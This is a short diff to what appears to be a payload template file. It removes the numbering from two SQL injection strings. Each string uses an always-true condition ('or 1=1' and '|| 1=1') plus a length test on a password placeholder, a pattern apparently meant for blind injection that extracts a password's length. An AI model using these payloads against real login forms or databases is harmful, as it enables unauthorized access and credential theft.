@@ -1,2 +1,2 @@
-0.' or 1=1 and length({pw})={i} 
-1.' || 1=1 && length({pw})={i}
+' or 1=1 and length({pw})={i} 
+' || 1=1 && length({pw})={i}
